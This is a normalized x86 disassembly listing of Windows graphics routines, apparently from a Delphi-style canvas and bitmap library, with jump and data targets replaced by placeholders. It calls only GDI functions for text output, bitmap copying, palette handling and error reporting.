mov eax [ ebp + 0xc ]
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call Rectangle
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_425460
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_42580c
mov ecx edi
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_42549c
push ebx
push esi
add esp 0xfffffff8
mov esi eax
xor ebx ebx
test [ esi + 0x54 ] 0x80
je r-xdata
mov eax ebx
pop ecx
pop edx
pop esi
pop ebx
retn
push esp
mov eax esi
call sub_425738
push eax
call GetWindowOrgEx
cmp [ esp ] 0x0
je r-xdata
mov bl 0x1
sub_4254c8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_42580c
mov eax ebx
call sub_42549c
cmp al 0x1
jne r-xdata
push 0x0
mov eax esi
call sub_40423c
push eax
mov eax esi
call sub_40443c
push eax
push 0x0
mov eax [ ebx + 0x54 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
mov eax [ ebx + 0x4 ]
push eax
call ExtTextOutA
mov edx esi
mov eax ebx
call sub_425598
mov edx eax
add edx edi
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_4253b4
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov edx esi
mov eax ebx
call sub_425598
inc eax
add edi eax
sub_425554
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_42580c
xor eax eax
mov [ esi ] eax
xor eax eax
mov [ esi + 0x4 ] eax
push esi
mov eax edi
call sub_40423c
push eax
mov eax edi
call sub_40443c
push eax
mov eax [ ebx + 0x4 ]
push eax
call GetTextExtentPoint32A
pop edi
pop esi
pop ebx
retn
sub_425598
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_425554
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_4255b4
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_425554
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_4255d4
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_425620
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x50 ] 0x0
sete [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425627
push rw-data
call LeaveCriticalSection
retn
mov eax ebx
call sub_42538c
sub_425680
push ebx
push esi
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_42580c
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetCurrentPositionEx
pop esi
pop ebx
retn
sub_4256a4
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
call sub_4253b4
pop ecx
pop edx
pop edi
pop esi
retn
sub_4256c4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_42580c
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetPixel
pop edi
pop esi
pop ebx
retn
sub_4256f0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_42580c
mov eax [ ebp + 0x8 ]
call sub_4242e8
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call SetPixel
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_425758
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov al [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov dl [ ebx + 0x8 ]
cmp dl al
je r-xdata
mov eax [ rw-data ]
push eax
push esi
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov al [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov [ ebx + 0x8 ] al
sub_4257b8
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
cmp esi eax
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov eax ebx
call sub_425758
mov edx esp
mov eax ebx
call sub_425680
mov eax [ esp ]
mov [ ebx + 0x18 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
and [ ebx + 0x8 ] 0xfe
or [ ebx + 0x8 ] 0x1
mov [ ebx + 0x4 ] esi
lea edx [ ebx + 0x18 ]
mov eax ebx
call sub_4256a4
sub_42580c
push ebx
push esi
push ecx
mov [ esp ] dl
mov esi eax
mov bl [ esi + 0x8 ]
not ebx
and bl [ esp ]
mov al [ r-xdata ]
cmp al bl
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl 0x1
je r-xdata
test bl 0x2
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
test bl 0x4
je r-xdata
mov eax esi
call sub_4258a8
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbc8
call sub_4039b8
test bl 0x8
je r-xdata
mov eax esi
call sub_4258d4
or bl [ esi + 0x8 ]
mov [ esi + 0x8 ] bl
mov eax esi
call sub_425904
sub_4258a8
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
call sub_4247bc
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_4242e8
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
pop ebx
retn
sub_4258d4
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_424cbc
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x10 ]
movzx eax [ eax + 0x18 ]
movzx eax [ eax * 2 + rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetROP2
pop ebx
retn
sub_425904
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
call sub_424fa8
push eax
call UnrealizeObject
mov eax [ ebx + 0x14 ]
call sub_424fa8
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x14 ]
call sub_425088
test al al
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_424f6c
call sub_4242e8
not eax
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x1
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_424f6c
call sub_4242e8
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x2
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
sub_425a34
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_425a7e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d64
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb0c
call sub_4039b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425a85
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
sub_425a88
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
push ebp
push sub_425b24
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
call sub_425a34
push 0x0
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push 0x400
push ebx
push 0x0
push 0x1000
call FormatMessageA
test eax eax
je r-xdata
lea eax [ ebp - 0x104 ]
lea edx [ ebp - 0x100 ]
mov ecx 0x100
call sub_4041ec
mov ecx [ ebp - 0x104 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb0c
call sub_4039b8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425b2b
lea eax [ ebp - 0x104 ]
call sub_403f7c
retn
sub_425b40
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x18 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_425c8e
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x34 ]
push eax
push 0x18
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
test bl bl
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateBitmap
mov [ ebp - 0x10 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_425bfd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call CreateCompatibleBitmap
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
call sub_425a88
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
push eax
push 0x0
call ReleaseDC
retn
call sub_425a88
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425c95
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov ebx eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov esi eax
push 0xcc0020
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x30 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call StretchBlt
test ebx ebx
je r-xdata
test esi esi
je r-xdata
push ebx
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
push esi
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
sub_425ca0
mov edx eax
dec dx
je r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
retn
sub dx 0x3
je r-xdata
sub dx 0x4
jne r-xdata
xor eax eax
retn
sub_425cd4
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x14 ]
mov ebx [ ebp + 0x18 ]
mov [ ebp - 0x9 ] 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
xor eax eax
mov [ ebp - 0x24 ] eax
push 0x0
call CreateCompatibleDC
call sub_425b30
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_425f54
push [ fs : eax ]
mov [ fs : eax ] esp
push esi
push ebx
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_425b30
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
push 0x0
mov eax [ rw-data ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
cmp [ ebp - 0x24 ] 0x0
je r-xdata
cmp ebx [ ebp + 0x2c ]
jne r-xdata
push 0xffffffff
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0xffffffff
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
jmp r-xdata
cmp esi [ ebp + 0x28 ]
jne r-xdata
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425f5b
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push 0xcc0020
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push r-xdata
push esi
push ebx
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push 0x0
push edi
call SetTextColor
mov [ ebp - 0x1c ] eax
push 0xffffff
push edi
call SetBkColor
mov [ ebp - 0x20 ] eax
push 0x8800c6
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
push 0x660046
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
mov eax [ ebp - 0x1c ]
push eax
push edi
call SetTextColor
mov eax [ ebp - 0x20 ]
push eax
push edi
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_425b30
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_425da7
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0xcc0020
mov eax 0xaa0029
call sub_406c90
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call MaskBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425f5b
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
sub_425f68
push ebx
push esi
push edi
mov esi eax
mov edi esi
mov edx 0xff
lea eax [ edi + edx * 4 ]
lea ecx [ edx + edx * 2 ]
lea ecx [ esi + ecx ]
mov bl [ ecx + 0x2 ]
mov [ eax + 0x2 ] bl
mov bl [ ecx + 0x1 ]
mov [ eax + 0x1 ] bl
mov cl [ ecx ]
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
dec edx
test edx edx
jne r-xdata
mov [ edi + 0x3 ] 0x0
pop edi
pop esi
pop ebx
retn
sub_425fa0
push ebx
push esi
push edi
add esp 0xfffffff8
mov [ esp ] edx
mov esi eax
mov [ esp + 0x4 ] esi
mov edi [ esp ]
mov edi [ edi ]
dec edi
test edi edi
jle r-xdata
mov eax [ esp ]
cmp [ eax ] 0x100
jge r-xdata
mov ecx 0x1
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov edx 0x100
sub edx [ eax ]
lea edx [ edx + edx * 2 ]
mov eax [ esp ]
mov eax [ eax ]
lea eax [ eax + eax * 2 ]
lea eax [ esi + eax ]
xor ecx ecx
call sub_402bf8
mov eax [ esp ]
mov [ eax ] 0x100
mov eax [ esp + 0x4 ]
lea eax [ eax + ecx * 4 ]
lea edx [ ecx + ecx * 2 ]
lea edx [ esi + edx ]
mov bl [ eax + 0x2 ]
mov [ edx + 0x2 ] bl
mov bl [ eax + 0x1 ]
mov [ edx + 0x1 ] bl
mov al [ eax ]
mov [ edx ] al
inc ecx
dec edi
jne r-xdata
sub_426018
push ebp
mov ebp esp
add esp 0xffffffd4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x2c ]
push eax
call GetSystemInfo
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
dec ecx
js r-xdata
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x2c ]
cmp [ eax + 0x20 ] 0x3
je r-xdata
push ebx
mov eax [ edx + ecx * 4 ]
bswap eax
shr eax 0x8
mov [ edx + ecx * 4 ] eax
dec ecx
jns r-xdata
xor ebx ebx
mov eax [ edx + ecx * 4 ]
mov bh al
mov bl ah
shr eax 0x10
shl ebx 0x8
mov bl al
mov [ edx + ecx * 4 ] ebx
dec ecx
jns r-xdata
pop ebx
jmp r-xdata
sub_426070
push ebp
mov ebp esp
add esp 0xfffffbf8
push ebx
mov [ ebp - 0x408 ] 0x300
mov [ ebp - 0x406 ] 0x10
lea edx [ ebp - 0x404 ]
mov ecx 0x40
call sub_402968
push 0x0
call GetDC
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42616d
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x68
mov eax [ ebp - 0x4 ]
push eax
call GetDeviceCaps
mov ebx eax
cmp ebx 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426174
mov eax [ ebp - 0x4 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebp - 0x404 ]
push eax
push 0x8
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
cmp [ ebp - 0x3e8 ] 0xc0c0c0
jne r-xdata
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x424 ]
push eax
push 0x8
sub ebx 0x8
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e8 ]
push eax
push 0x1
mov eax ebx
sub eax 0x8
push eax
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x420 ]
push eax
push 0x7
sub ebx 0x7
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e4 ]
push eax
push 0x1
push 0x7
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
jmp r-xdata
sub_426188
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_42620e
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x68
mov eax [ ebp - 0x8 ]
push eax
call GetDeviceCaps
cmp eax 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebx + 0x4 ]
push eax
push 0x8
push 0x0
mov eax [ rw-data ]
push eax
call GetPaletteEntries
movzx eax [ ebx + 0x2 ]
lea eax [ ebx + eax * 4 - 0x1c ]
push eax
push 0x8
push 0x8
mov eax [ rw-data ]
push eax
call GetPaletteEntries
mov [ ebp - 0x1 ] 0x1
sub_426220
push ebx
push esi
push edi
add esp 0xfffffbfc
mov edi eax
xor esi esi
mov [ esp ] 0x300
test edi edi
je r-xdata
mov [ esp + 0x2 ] cx
mov eax edx
lea edx [ esp + 0x4 ]
shl ecx 0x2
call sub_402968
push 0x0
call CreateCompatibleDC
mov ebx eax
push edi
push ebx
call SelectObject
mov edi eax
lea eax [ esp + 0x4 ]
push eax
push 0x100
push 0x0
push ebx
call GetDIBColorTable
mov [ esp + 0x2 ] ax
push edi
push ebx
call SelectObject
push ebx
call DeleteDC
jmp r-xdata
mov eax esi
add esp 0x404
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2 ] 0x10
jne r-xdata
cmp [ esp + 0x2 ] 0x0
je r-xdata
movzx edx [ esp + 0x2 ]
lea eax [ esp + 0x4 ]
call sub_426018
mov eax esp
call sub_426188
test al al
jne r-xdata
mov eax esp
push eax
call CreatePalette
mov esi eax
sub_4262c4
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ esp ] eax
test ebx ebx
je r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
lea eax [ edi + 0x1 ]
cmp eax [ esp ]
jge r-xdata
push esi
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
mov eax esi
mov edx [ esp ]
call sub_426018
mov [ esp ] eax
sub_426318
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
shr [ eax + 0x8 ] 0x1
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0xe ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_425cc0
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0xe ]
call sub_425ca0
mov esi eax
push 0x0
call GetDC
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_4264c4
push [ fs : edx ]
mov [ fs : edx ] esp
mov edi [ ebp - 0x4 ]
mov eax edi
add eax 0x28
mov edx esi
shl edx 0x2
add eax edx
mov [ ebp - 0x14 ] eax
push 0x0
mov eax [ ebp - 0x4 ]
push edi
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_425b30
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4263ea
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ebp - 0xc ]
call sub_425b40
mov [ ebx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4263f1
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
call sub_425a34
sub_4263f1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
add [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov bx 0x1
mov [ eax + 0xe ] bx
mov eax [ ebp - 0x4 ]
movzx edx bx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_425cc0
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x20 ] 0x2
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24 ] 0x2
mov eax [ ebp - 0x4 ]
add eax 0x28
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] 0xffffff
push 0x0
mov ebx [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_425b30
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4264a4
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0xc ]
call sub_425b40
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4264ab
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
sub_4264e0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor ecx ecx
mov cl [ edx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
sub ecx eax
xor ebx ebx
mov bl [ edx + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub ebx [ edx + 0x4 ]
mov esi [ ebp - 0x4 ]
movzx esi [ esi ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub esi eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov edi eax
mov eax esi
cdq
xor eax edx
sub eax edx
cmp edi eax
jg r-xdata
xor eax eax
jmp r-xdata
test ecx ecx
jle r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax ebx
cdq
xor eax edx
sub eax edx
mov ecx eax
mov eax [ ebp - 0x8 ]
cdq
xor eax edx
sub eax edx
cmp ecx eax
jg r-xdata
cmp esi ecx
jl r-xdata
test ebx ebx
jle r-xdata
mov al 0x1
cmp ebx [ ebp - 0x8 ]
jle r-xdata
sub_426570
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0xc ]
mov eax [ ebp - 0xc ]
shl eax 0x4
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
call sub_407e1c
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_426867
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebx ]
or eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
mov [ eax ] edx
mov edx [ ebx + 0x4 ]
mov [ eax + 0x4 ] edx
push 0xb
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
push 0xc
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
xor edx edx
push ebp
push sub_426659
push [ fs : edx ]
mov [ fs : edx ] esp
push 0xe
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xc
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax ebx
cmp ax 0x8
jbe r-xdata
call sub_425a34
push 0x0
call GetDC
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] 0x7fffffff
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426660
